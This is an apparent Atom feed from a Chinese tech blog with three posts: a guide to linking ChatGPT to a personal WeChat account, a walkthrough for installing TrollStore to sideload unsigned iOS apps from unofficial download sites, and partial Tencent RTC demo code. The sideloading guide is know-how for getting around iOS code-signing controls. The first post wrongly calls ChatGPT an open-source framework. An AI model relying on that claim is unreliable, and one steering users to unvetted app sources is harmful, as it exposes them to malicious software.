<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>游魂的网络日志</title>
  
  <subtitle>分享技术，记录点滴</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="//www.shen.ee/"/>
  <updated>2022-12-16T01:36:09.893Z</updated>
  <id>//www.shen.ee/</id>
  
  <author>
    <name>Andy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>OpenAI ChatGPT 接入微信，与AI互动！</title>
    <link href="//www.shen.ee/article/35220.html"/>
    <id>//www.shen.ee/article/35220.html</id>
    <published>2022-12-11T04:38:39.000Z</published>
    <updated>2022-12-16T01:36:09.893Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近的热门话题，OpenAI 推出的ChatGPT绝对榜上有名！但是不说注册难度，只说每次需要一些不可抗力的原因才能访问使用就很麻烦，大部分人无法体验到，本文介绍的方式直接对接个人微信（不是公众号）非常平民！基本上有电脑就能自己搭建，文末有免费体验。</p></blockquote><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/ae83b295-faa0-4f4b-9f92-f8e0f50ec3c9.gif" alt="banner.gif"></p><h2 id="ChatGPT是什么？"><a href="#ChatGPT是什么？" class="headerlink" title="ChatGPT是什么？"></a>ChatGPT是什么？</h2><p>ChatGPT是一款开源的聊天机器人框架，它使用了OpenAI的GPT-3语言模型，可以实现自然语言处理、问答和对话生成等功能。通俗的说就是一款AI聊天机器人 。</p><p><strong>它可以在模仿人类说话风格的同时回答大量的问题</strong></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/3fb7d5ee-8841-4744-abd2-0b2e28de659f.png" alt="Snipaste_2022-12-11_10-08-00.png" style="zoom: 50%;"></p><p><strong>它可以帮助程序员写出一段代码</strong></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/10c41e8d-7dee-4128-a26a-a3d6ac425ff6.png" alt="Snipaste_2022-12-11_10-11-08.png" style="zoom:50%;"></p><p><strong>也可以帮你计算</strong></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/9ab09506-3464-4e77-8891-36d2455c3f43.png" alt="Snipaste_2022-12-11_10-19-11.png" style="zoom:50%;"></p><p><strong>总之可以回答很多问题</strong></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/1d9841e6-e279-4683-aa23-c0a79da2ae5d.png" alt="Snipaste_2022-12-11_10-21-06.png" style="zoom:50%;"></p><h2 id="注册ChatGPT攻略"><a href="#注册ChatGPT攻略" class="headerlink" title="注册ChatGPT攻略"></a>注册ChatGPT攻略</h2><p>网上的文章很多，这里就不重复写了。需要注意的就是<strong>网络</strong>、国外手机号。</p><p>可以参考文章：<a href="https://juejin.cn/post/7173447848292253704" target="_blank" rel="noopener">OpenAI 推出超神 ChatGPT 注册攻略来了</a></p><h2 id="接入个人微信"><a href="#接入个人微信" class="headerlink" title="接入个人微信"></a>接入个人微信</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li>OpenAI 账号（前提账号有信誉额度，一般为18美元，注册就送）</li><li>微信账号 （建议小号）</li><li>API Key</li></ul><p><strong>获取API Key教程（配置文件需要填写API Key)</strong></p><ol><li><p>登陆 OpenAI - 右上角头像 - <code>View API keys</code></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/8ec75e8a-4d25-4195-9c71-6d1fda678355.png" alt="Snipaste_2022-12-11_10-40-59.png"></p></li><li><p>点击 <code>Create new secret key</code></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/4d63add6-3a36-49c6-9d6f-b8d3287f9586.png" alt="QQ20221211-104210@2x.png"></p></li><li><p>API Key 创建成功后复制收藏好这个Key接下来会用到，点击OK后，Key不会再完整显示。只能删了重新生成Key！</p></li></ol><h3 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h3><p><a href="https://github.com/869413421/wechatbot" target="_blank" rel="noopener">https://github.com/869413421/wechatbot</a></p><p>项目基于openwechat 开发的，微信的SDK，请移步这个仓库查看：<a href="https://github.com/eatmoreapple/openwechat" target="_blank" rel="noopener">https://github.com/eatmoreapple/openwechat</a></p><p>鉴于国内访问Github困难 可以使用代理：<a href="https://ghproxy.com/" target="_blank" rel="noopener">https://ghproxy.com/</a></p><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><h4 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h4><p>Windows 和 Linux都可以，但是本机需要有Golang环境。参考：<a href="https://www.iyouhun.com/post-200.html" target="_blank" rel="noopener">Linux服务器搭建部署GO环境</a></p><p>然后直接编译运行项目即可。<strong>推荐有一定的技术的童鞋看这部分，不懂技术移步方式二</strong>。</p><ul><li><p>拉取代码，安装依赖。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://ghproxy.com/https://github.com/869413421/wechatbot</span><br><span class="line">cd wechat-chatGPT</span><br><span class="line">go mod tidy</span><br></pre></td></tr></table></figure></li><li><p>启动运行项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run main.go</span><br></pre></td></tr></table></figure></li></ul><h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><p><strong>这部分建议不太懂技术或嫌编译麻烦的童鞋参考，一把梭哈部署！</strong></p><p>Windows 和 Linux都可以，本地不需Golang环境。下载可执行文件直接启动运行。</p><p>下载地址：<a href="https://gitee.com/shtml/wechatbot/tree/main/bin" target="_blank" rel="noopener">https://gitee.com/shtml/wechatbot/tree/main/bin</a></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/b7e972a1-a68b-4457-b0b5-3bfd339437d3.png" alt="Snipaste_2022-12-11_10-34-00.png" style="zoom:50%;"></p><p>下载你本系统需要的可执行文件和配置文件（config.json），注意修改配置文件（下面有描述）！</p><p><strong>注意：可执行文件 和 配置文件放到同一个目录！</strong></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/7d871a14-2d99-4c71-8ef7-d65e83da0c28.png" alt="Snipaste_2022-12-11_10-37-36.png" style="zoom:50%;"></p><p>启动运行，Windows直接双击运行即可！</p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/188303/28/30754/13194/63908907E93431ca4/3bbd4e2ddbd595f6.png" alt=""></p><h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><p>新建配置文件 <code>config.json</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"api_key"</span>: <span class="string">"your api key"</span>,</span><br><span class="line">  <span class="attr">"auto_pass"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>your api key 位置，粘贴上面你获取到的API key。</li><li>auto_pass 是否自动通过好友请求（如果人非常多加好友，建议设置成 false，因为频繁好友申请会导致程序崩溃）</li></ul><h4 id="启动运行"><a href="#启动运行" class="headerlink" title="启动运行"></a>启动运行</h4><p>程序启动成功后，浏览器会弹窗一个二维码。直接使用你的微信（微信机器人）扫码登陆即可。</p><p>如果Linux服务器上启动，将日志中的图片地址在自己的浏览器打开扫码即可。</p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/188303/28/30754/13194/63908907E93431ca4/3bbd4e2ddbd595f6.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">访问下面网址扫描二维码登录</span><br><span class="line">https://login.weixin.qq.com/qrcode/gdOa1pgupQ==</span><br><span class="line">2022/12/11 08:19:50 扫码成功,请在手机上确认登录</span><br><span class="line">2022/12/11 08:20:01 登录成功</span><br></pre></td></tr></table></figure><p>微信登陆成功以后，在可执行文件所在的目录多了一个 <code>storage.json</code> 文件。</p><p>下次启动程序无需再次扫码登陆微信就能使用了！</p><p>却换到其他微信登录一定要将这个 <code>storage.json</code> 文件删除掉，否则会切换失败。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2022/12/11 08:19:33 login error: write storage.json: bad file descriptor</span><br></pre></td></tr></table></figure><h3 id="微信聊天"><a href="#微信聊天" class="headerlink" title="微信聊天"></a>微信聊天</h3><p>微信机器人可以通过群聊中@ 或者 私聊，解答各种问题。</p><p><strong>私聊</strong></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/f8ee8bcd-5075-46d9-b511-dbeb90a3d66f.png" alt="Snipaste_2022-12-11_10-51-56.png" style="zoom:50%;"></p><p><strong>群聊@</strong></p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f7898561-b8f3-4d75-8860-8fd0c9a879a8/38a7c587-e123-415a-b058-a58b25144330.png" alt="Snipaste_2022-12-11_10-59-28.png" style="zoom:50%;"></p><h2 id="体验-Bot"><a href="#体验-Bot" class="headerlink" title="体验 Bot"></a>体验 Bot</h2><p>微信搜索添加 <code>iyouhun</code>，发送关键词 <code>AI体验</code> 即可自动拉进体验群</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;最近的热门话题，OpenAI 推出的ChatGPT绝对榜上有名！但是不说注册难度，只说每次需要一些不可抗力的原因才能访问使用就很麻烦，大部分人无法体验到，本文介绍的方式直接对接个人微信（不是公众号）非常平民！基本上有电脑就能自己搭建，文末有免费体验
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="OpenAI" scheme="//www.shen.ee/tags/OpenAI/"/>
    
      <category term="ChatGPT" scheme="//www.shen.ee/tags/ChatGPT/"/>
    
      <category term="AI聊天" scheme="//www.shen.ee/tags/AI%E8%81%8A%E5%A4%A9/"/>
    
      <category term="AI聊天机器人" scheme="//www.shen.ee/tags/AI%E8%81%8A%E5%A4%A9%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
      <category term="微信机器人" scheme="//www.shen.ee/tags/%E5%BE%AE%E4%BF%A1%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
  </entry>
  
  <entry>
    <title>【免越狱】IOS第三方软件永久安装方法汇总！绕过证书限制！大部分系统版本适用！附各种第三方软件分享</title>
    <link href="//www.shen.ee/article/42702.html"/>
    <id>//www.shen.ee/article/42702.html</id>
    <published>2022-11-11T05:50:39.000Z</published>
    <updated>2022-12-16T01:36:09.894Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>众所周知，ios系统在因其系统生态的封闭性，隐私性，安全性的考虑，一直对第三方软件限制的非常严重；想安装第三方ipa软件，在早些时候，只有越狱这一条路可走。越狱当然行，但即便不考虑越狱后的稳定性，也有一部分小伙伴，仅仅只有安装个别第三方软件的一个需求，为此而越狱，略显小题大做了。</p><p>后来可以利用证书来签名第三方软件，但这种方法一直都有一个缺点，那就是受到<strong>证书有效期</strong>的限制，个人证书只有7天，还需借助电脑，开发者和企业证书虽然时间长，但大都不是免费的，收费而且极不稳定，属于无奈之选。</p><p>现在有了 TrollStore 中文巨魔 永久签名工具，<strong>可以免证书永久安装第三方ipa软件【部分型号处理器免越狱且不受关机重启限制】</strong></p><h2 id="巨魔-TrollStore-永久签名工具"><a href="#巨魔-TrollStore-永久签名工具" class="headerlink" title="巨魔 TrollStore 永久签名工具"></a>巨魔 TrollStore 永久签名工具</h2><blockquote><p>Github 地址：<a href="https://github.com/opa334/TrollStore" target="_blank" rel="noopener">https://github.com/opa334/TrollStore</a></p></blockquote><p><strong>什么是TrollStore？</strong></p><p>TrollStore是一款iOS应用程序,用于在iOS 14和iOS 15上签名和安装IPA文件,而不需要签名，通常这种行为需要在越狱后才能实现的功能，而它不需要。这个APP翻译过来为巨魔。它无需帐户，无需登录，无需证书，无需越狱，IPA 安装后永不过期，完全免费，使用简单方便。</p><p><strong>我的手机能用TrollStore吗？</strong></p><p>首先需要你的手机是苹果手机其次就是CPU处理器是A8-A15（iPhone6 - iPhone13）系列并且系统版本是14.0-15.41（15.5 beta1-4/15.6 beta1-4）才可以使用。可以看下作者Github给出的列表。</p><p><img src="https://oss.iyouhun.com/img/md/202211111053284.png" alt="image-20221111105318973"></p><h2 id="安装巨魔"><a href="#安装巨魔" class="headerlink" title="安装巨魔"></a>安装巨魔</h2><h3 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h3><p> <strong>看清楚你手机的系统版本和处理器</strong>，是否<strong>都符合</strong>，符合就继续，不符合是肯定无法成功的！教程全程无需电脑！</p><p>系统版本查看方法：设置-通用-关于本机-软件版本</p><p>处理器型号查看方法：打开百度输入：iPhone 13 是什么处理器？iPhone 14 Pro 是什么处理器？</p><h3 id="二、各种版本安装方法汇总"><a href="#二、各种版本安装方法汇总" class="headerlink" title="二、各种版本安装方法汇总"></a>二、各种版本安装方法汇总</h3><blockquote><p>这里为了方便不同的版本我称作版本 A、版本 B、版本 C，请根据自己情况安装</p></blockquote><h4 id="版本A安装方法"><a href="#版本A安装方法" class="headerlink" title="版本A安装方法"></a>版本A安装方法</h4><p><strong>iOS/iPadOS</strong></p><p><strong>系统版本：15.0-15.5 beta4</strong></p><p><strong>处理器：A9-A15</strong></p><p><strong>必须二者都符合</strong></p><p>1、复制链接：<a href="https://api.jailbreaks.app/troll" target="_blank" rel="noopener">https://api.jailbreaks.app/troll</a></p><p>2、使用自带 Safari 浏览器【粘贴并前往】点击打开并安装，安装完成后设备桌面会出现【GTA Car Tracker】图标</p><p><img src="https://oss.iyouhun.com/img/md/202211111059079.png" alt="图片"></p><p>3、打开 GTA Car Tracker (如果这个 app 没有直接出现，重启设备即可)，点击 Install TrollStore 安装 TrollStore</p><p><img src="https://oss.iyouhun.com/img/md/202211111059411.png" alt="图片"></p><p>4、上面一步如果点击 Install TrollStore出现error 报错，显示“似乎已断开与互联网的连接”解决方法：</p><ol><li>删掉刚刚安装的GTA Car Tracker软件</li><li>打开 App Store 搜索GTA Car Tracker 软件，安装后打开软件，<strong>出现联网弹窗，允许网络权限——无限局域网与蜂窝网络</strong></li><li>之后就可以删除这个 App store版本的GTA Car Tracker软件。再重新回到最开始的第一步：用复制蓝色链接的方法，去安装GTA Car Tracker</li></ol><p>5、如果没有出现报错，请继续：成功安装 TrollStore 工具后，TrollStore 图标会出现在主屏幕上。打开 TrollStore 点击底部【Settings】，再点击【Install ldid】，以便 TrollStore 可以安装未签名的应用程序。</p><p><img src="https://oss.iyouhun.com/img/md/202211111137476.jpeg" alt="图片"></p><h4 id="版本B安装方法"><a href="#版本B安装方法" class="headerlink" title="版本B安装方法"></a>版本B安装方法</h4><p><strong>iOS/iPadOS</strong></p><p><strong>系统版本：14.x</strong></p><p><strong>处理器：A12-A14</strong></p><p><strong>必须二者都符合</strong></p><p>1、复制链接：<a href="https://api.jailbreaks.app/troll64e" target="_blank" rel="noopener">https://api.jailbreaks.app/troll64e</a> <strong>【请注意，和上面蓝色链接不一样！】</strong></p><p>2、使用自带 Safari 浏览器【粘贴并前往】点击打开并安装，安装完成后设备桌面会出现【GTA Car Tracker】图标</p><p>3、打开 GTA Car Tracker (如果这个 app 没有直接出现，重启设备即可)，点击 Install TrollStore 安装 TrollStore、</p><p>4、如果出现error报错，还按上面方法解决。</p><p>5、如果没有出现报错，成功安装 TrollStore 工具后，TrollStore 图标会出现在主屏幕上。打开 TrollStore 点击底部【Settings】，再点击【Install ldid】，以便 TrollStore 可以安装未签名的应用程序。</p><h4 id="版本C安装方法"><a href="#版本C安装方法" class="headerlink" title="版本C安装方法"></a>版本C安装方法</h4><p><strong>iOS/iPadOS</strong></p><p><strong>系统版本：14.x</strong></p><p><strong>处理器：A9-A11</strong></p><p><strong>必须二者都符合</strong></p><p>注：14.x 且处理器为a9-a11的利用方法似乎有些问题，暂不能免越狱实现，请使用checkra1n + TrollHelper的方法安装 （可在 Havoc 源 <a href="https://havoc.app/" target="_blank" rel="noopener">https://havoc.app/</a> 上安装TrollStore Helper）<br>此教程不再提供详细越狱方法。</p><p><em>不建议已越狱的用户使用 TrollStore 因为越狱了本身就可以不用签名安装应用</em></p><h2 id="利用TrollStore安装-卸载第三方ipa软件"><a href="#利用TrollStore安装-卸载第三方ipa软件" class="headerlink" title="利用TrollStore安装/卸载第三方ipa软件"></a>利用TrollStore安装/卸载第三方ipa软件</h2><p>1、将需要安装的应用程序 IPA 安装包下载到 iPhone/iPad上，选择 TrollStore 打开就会自动开始安装，完成后就可以永久有效打开安装的免签名 App</p><p>2、如果桌面没有出现图标，可以点击 TrollStore 底部 Settings 里的 Respring 注销一次桌面</p><p>3、如果想要卸载安装的 App，直接在 TrollStore 底部 Apps 左滑 Delete 删除</p><p><img src="https://oss.iyouhun.com/img/md/202211111329340.png" alt="image-20221111132916246"></p><p>4、微信或者QQ等软件，可以直接点击【其他应用打开】按钮，选择TrollStore打开</p><p><img src="https://oss.iyouhun.com/img/md/202211111328408.png" alt="图片"></p><h2 id="如何找到第三方ipa安装包"><a href="#如何找到第三方ipa安装包" class="headerlink" title="如何找到第三方ipa安装包"></a>如何找到第三方ipa安装包</h2><blockquote><p>注：任何第三方网站ipa资源都没有说100%绝对安全，安装使用前自行斟酌。</p></blockquote><p><strong>1、大神汇总：（看不懂不要乱装）</strong></p><p><a href="https://github.com/34306/TrollStoreiPA/releases/tag/TS_DailyiPA" target="_blank" rel="noopener">https://github.com/34306/TrollStoreiPA/releases/tag/TS_DailyiPA</a></p><p><strong>2、开发者原版部分ipa包：</strong></p><p>开发者原版 <strong>Filza</strong> IPA 【系统文件管理器】下载地址：<a href="https://tigisoftware.com/download/Filza_3.9.7.ipa" target="_blank" rel="noopener">https://tigisoftware.com/download/Filza_3.9.7.ipa</a></p><p>开发者原版 <strong>Apps Manager</strong> IPA 【功能强大的app管理器】下载地址：<a href="https://tigisoftware.com/download/AppsManager_1.7.0.ipa" target="_blank" rel="noopener">https://tigisoftware.com/download/AppsManager_1.7.0.ipa</a></p><p>开发者原版 <strong>TrollNonce</strong> IPA 【固定G值】下载地址：<a href="https://github.com/opa334/TrollNonce/releases/download/1.0.1/TrollNonce.ipa" target="_blank" rel="noopener">https://github.com/opa334/TrollNonce/releases/download/1.0.1/TrollNonce.ipa</a></p><p>开发者原版 <strong>AppStore++</strong> IPA 【免越狱在App Store下载老版本软件】下载地址：<a href="https://github.com/CokePokes/AppStorePlus-TrollStore/releases/download/v1.2-1/AppStore++_TrollStore_v1.2-1.ipa" target="_blank" rel="noopener">https://github.com/CokePokes/AppStorePlus-TrollStore/releases/download/v1.2-1/AppStore++_TrollStore_v1.2-1.ipa</a></p><p>开发者原版 <strong>Mugunghwa</strong> IPA 【免越狱美化软件】下载地址：<a href="https://github.com/s8ngyu/Mugunghwa/releases/download/2.0.3/Mugunghwa.ipa" target="_blank" rel="noopener">https://github.com/s8ngyu/Mugunghwa/releases/download/2.0.3/Mugunghwa.ipa</a></p><p><strong>3、网友分享ipa软件包，包含了多开微信等</strong></p><p><a href="https://pan.ios98.com" target="_blank" rel="noopener">https://pan.ios98.com</a></p><p><a href="https://pan.iosapp.top" target="_blank" rel="noopener">https://pan.iosapp.top</a></p><p><a href="https://iosapp6.top" target="_blank" rel="noopener">https://iosapp6.top</a></p><p><a href="http://pan.jd888.ml/Onedrive" target="_blank" rel="noopener">http://pan.jd888.ml/Onedrive</a></p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="TrollStore-无法安装-app"><a href="#TrollStore-无法安装-app" class="headerlink" title="TrollStore 无法安装 app"></a>TrollStore 无法安装 app</h3><p>成功安装 TrollStore 工具后，需要点击 TrollStore 底部【Settings】，再点击【Install ldid】，这样 TrollStore 才能安装未签名的应用程序（当然并不是所有 IPA 都支持 TrollStore 安装，但绝大部分都可以）</p><p><img src="https://oss.iyouhun.com/img/md/202211111137476.jpeg" alt="图片"></p><h3 id="重启后-TrollStore-安装的-app-闪退"><a href="#重启后-TrollStore-安装的-app-闪退" class="headerlink" title="重启后 TrollStore 安装的 app 闪退"></a>重启后 TrollStore 安装的 app 闪退</h3><p>由于 iOS 15.x 是无根模式，安装了 TrollStore之后，点击 TrollStore-Settings-Install Persistence Helper，选择一个自己不用的系统自带应用注入（比如 Tips【提示】app），这样设备重启后，如果 TrollStore 安装的 app 或者它自己出现闪退，那就可以点击之前选择的注入应用（比如 Tips【提示】app），重新激活即可正常打开。</p><p><img src="https://oss.iyouhun.com/img/md/202211111348343.png" alt="img"></p><h3 id="TrollStore-如何更新版本"><a href="#TrollStore-如何更新版本" class="headerlink" title="TrollStore 如何更新版本"></a>TrollStore 如何更新版本</h3><p>TrollStore 1.1 版本开始内置一键更新按钮，当有新版本推送时，会在 Settings 顶部出现更新按钮，点击即可自动更新安装。</p><p><img src="https://oss.iyouhun.com/img/md/202211111404809.png" alt="image-20221111140457691"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;众所周知，ios系统在因其系统生态的封闭性，隐私性，安全性的考虑，一直对第三方软件限制的非常严重；想安装第三方ipa软件，在早些时候，只有越
      
    
    </summary>
    
      <category term="工具" scheme="//www.shen.ee/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="巨魔" scheme="//www.shen.ee/tags/%E5%B7%A8%E9%AD%94/"/>
    
      <category term="TrollStore" scheme="//www.shen.ee/tags/TrollStore/"/>
    
      <category term="ios安装ipa" scheme="//www.shen.ee/tags/ios%E5%AE%89%E8%A3%85ipa/"/>
    
      <category term="ios免越狱" scheme="//www.shen.ee/tags/ios%E5%85%8D%E8%B6%8A%E7%8B%B1/"/>
    
      <category term="ios签名" scheme="//www.shen.ee/tags/ios%E7%AD%BE%E5%90%8D/"/>
    
      <category term="ios多开" scheme="//www.shen.ee/tags/ios%E5%A4%9A%E5%BC%80/"/>
    
      <category term="ios微信多开" scheme="//www.shen.ee/tags/ios%E5%BE%AE%E4%BF%A1%E5%A4%9A%E5%BC%80/"/>
    
  </entry>
  
  <entry>
    <title>IM腾讯实时音视频小记</title>
    <link href="//www.shen.ee/article/37442.html"/>
    <id>//www.shen.ee/article/37442.html</id>
    <published>2022-09-26T02:54:39.000Z</published>
    <updated>2022-12-16T01:36:09.893Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Uniapp使用腾讯实时音视频（demo）"><a href="#Uniapp使用腾讯实时音视频（demo）" class="headerlink" title="Uniapp使用腾讯实时音视频（demo）"></a>Uniapp使用腾讯实时音视频（demo）</h2><ol><li><p>在插件市场购买插件(0元) <a href="https://ext.dcloud.net.cn/plugin?id=9035" target="_blank" rel="noopener">https://ext.dcloud.net.cn/plugin?id=9035</a> </p><ol><li><p>输入安卓包名（hbuilder点击发行 原生app云打包之后可以看到包名）</p><p><img src="https://oss.iyouhun.com/img/md/202209261150481.png" alt="image-20220926115011379"></p></li><li><p>配置插件</p><p><img src="https://oss.iyouhun.com/img/md/202209261144217.png" alt="image-20220926114442012"></p></li></ol></li><li><p>完成步骤1后 打包（发行 原生app云打包）使用公共测试证书</p></li><li><p>自定义调试基座 然后运行到安卓app基座（连接手机调试)</p><p><img src="https://oss.iyouhun.com/img/md/clip_image004.jpg" alt="img"></p></li><li><p>第一行引入原生插件（只能在app中生效），其它是腾讯云的配置，userId自己定义，userSig建议服务端生成（<a href="https://cloud.tencent.com/document/product/647/17275" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/647/17275</a>)</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> TUICallKit = uni.requireNativePlugin(<span class="string">'TencentCloud-TUICallKit'</span>)</span><br><span class="line"><span class="keyword">const</span> TUICallingEvent = uni.requireNativePlugin(<span class="string">'globalEvent'</span>)</span><br><span class="line"><span class="keyword">const</span> sdkAppId = <span class="number">1400737560</span></span><br><span class="line"><span class="keyword">const</span> userId = <span class="string">'xxx'</span></span><br><span class="line"><span class="keyword">const</span> userSig = <span class="string">'eJyrVgrxCdYrSy1S...'</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">created() &#123;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">SDKAppID: sdkAppId,</span><br><span class="line">userID: userId,</span><br><span class="line">userSig: userSig,</span><br><span class="line">&#125;</span><br><span class="line">TUICallKit.login(options, (res) =&gt; &#123;</span><br><span class="line"><span class="keyword">if</span> (res.code === <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'已登录'</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`login failed, error message = <span class="subst">$&#123;res.msg&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">TUICallingEvent.addEventListener(<span class="string">'onError'</span>, (res) =&gt; &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'onError'</span>, <span class="built_in">JSON</span>.stringify(res))</span><br><span class="line">&#125;)</span><br><span class="line">TUICallingEvent.addEventListener(<span class="string">'onCallReceived'</span>, (res) =&gt; &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'onCallReceived'</span>, <span class="built_in">JSON</span>.stringify(res))</span><br><span class="line">&#125;)</span><br><span class="line">TUICallingEvent.addEventListener(<span class="string">'onCallCancelled'</span>, (res) =&gt; &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'onCallCancelled'</span>, res)</span><br><span class="line">&#125;)</span><br><span class="line">TUICallingEvent.addEventListener(<span class="string">'onCallBegin'</span>, (res) =&gt; &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'onCallBegin'</span>, <span class="built_in">JSON</span>.stringify(res))</span><br><span class="line">&#125;)</span><br><span class="line">TUICallingEvent.addEventListener(<span class="string">'onCallEnd'</span>, (res) =&gt; &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'onCallEnd'</span>, <span class="built_in">JSON</span>.stringify(res))</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>之后就可以根据文档操作了，发起挂断事件监听（<a href="https://cloud.tencent.com/document/product/647/78762" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/647/78762</a>)</li></ol><h2 id="Web使用腾讯实时音视频（demo）"><a href="#Web使用腾讯实时音视频（demo）" class="headerlink" title="Web使用腾讯实时音视频（demo）"></a>Web使用腾讯实时音视频（demo）</h2><ol><li><p>测试使用script引入 也可以使用npm（<a href="https://cloud.tencent.com/document/product/647/78731）" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/647/78731）</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./trtc-js-sdk/trtc.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./tim-js-sdk/tim-js.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./tsignaling/tsignaling-js.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./tuicall- engine-webrtc/tuicall-engine-webrtc.js"</span>&gt;</span><span class="undefined"></span><span 